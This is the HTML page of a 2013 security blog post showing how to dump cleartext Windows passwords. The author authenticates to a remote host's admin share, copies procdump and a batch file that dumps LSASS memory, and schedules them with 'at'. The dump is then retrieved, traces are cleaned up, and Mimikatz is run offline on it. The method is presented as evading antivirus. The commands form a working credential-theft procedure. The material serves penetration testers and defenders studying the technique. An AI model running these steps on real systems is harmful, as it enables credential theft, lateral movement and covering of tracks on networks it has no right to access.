@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool" />
+<meta property="og:description" content="Mimikatz is now built into Metasploit&rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2013-06-07T15:00:08+00:00" />
+<meta property="article:modified_time" content="2013-06-07T15:00:08+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool"/>
+<meta name="twitter:description" content="Mimikatz is now built into Metasploit&rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" /><link rel="prev" href="https://malicious.link/posts/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/" /><link rel="next" href="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2013\/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a\/"
+        },"genre": "posts","wordcount":  378 ,
+        "url": "https:\/\/malicious.link\/posts\/2013\/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a\/","datePublished": "2013-06-07T15:00:08+00:00","dateModified": "2013-06-07T15:00:08+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mubix"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mubix</a></span>&nbsp;<span class="post-category">included in <a href="/categories/mimikatz/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>mimikatz</a>&nbsp;<a href="/categories/meterpreter/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>meterpreter</a>&nbsp;<a href="/categories/metasploit/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>metasploit</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2013-06-07">2013-06-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;378 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>Mimikatz is now <a href="https://github.com/rapid7/meterpreter/pull/9" target="_blank" rel="noopener noreffer ">built into Metasploit&rsquo;s meterpreter</a>, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</p>
+<p>Mimikatz Minidump: <a href="http://blog.gentilkiwi.com/securite/mimikatz/minidump" target="_blank" rel="noopener noreffer ">http://blog.gentilkiwi.com/securite/mimikatz/minidump</a></p>
+<p>Procdump: <a href="http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener noreffer ">http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</a></p>
+<p>Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
+</span></span><span class="line"><span class="cl">dir \\TARGETBOX\C$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If that works then we want to check that we can all the &ldquo;AT&rdquo; command on the remote host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">at \\TARGETBOX
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir \\TARGETBOX\C$\Temp
+</span></span><span class="line"><span class="cl">dir \\TARGETBOX\C$\Temp
+</span></span><span class="line"><span class="cl">copy c:\temp\procdump.exe \\TARGETBOXC$
+</span></span><span class="line"><span class="cl">copy c:\temp\procdump.bat \\TARGETBOXC$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The contents of procdump.bat are:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript" data-lang="gdscript"><span class="line"><span class="cl"><span class="err">@</span><span class="n">echo</span> <span class="n">off</span>
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">procdump</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">ma</span> <span class="n">lsass</span><span class="o">.</span><span class="n">exe</span> <span class="nx">%COMPUTERNAME%_lsass</span><span class="o">.</span><span class="n">dmp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I&rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&rsquo;ve dumped more than one IP that is actually the same host.</p>
+<p>Next we schedule the task. Use net time to determine the local time for the remote machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net time \\TARGETBOX
+</span></span><span class="line"><span class="cl">at \\TARGETBOX 13:52 C:\Temp\procdump.bat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Pull down the file and clean up:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dir \\TARGETBOX\C$\Temp
+</span></span><span class="line"><span class="cl">copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
+</span></span><span class="line"><span class="cl">rmdir /s \\TARGETBOX\C$\Temp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:<a href="http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png" target="_blank" rel="noopener noreffer ">http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png</a></p>
+<p>Load up the Alpha version of Mimikatz, switch it to minidump mode and you&rsquo;re dumping creds:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+</span></span><span class="line"><span class="cl">Switch to MINIDUMP
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz # sekurlsa::logonPasswords full
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Thats it. Password dumping without ever using a &ldquo;Hacker&rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator <a href="http://twitter.com/gentilkiwi" target="_blank" rel="noopener noreffer ">@gentilkiwi</a> - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2013-06-07</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" data-title="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" data-title="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" data-title="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" data-title="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" data-title="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/" class="prev" rel="prev" title="Query all windows services config from the command line"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Query all windows services config from the command line</a>
+            <a href="/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" class="next" rel="next" title="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1">Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
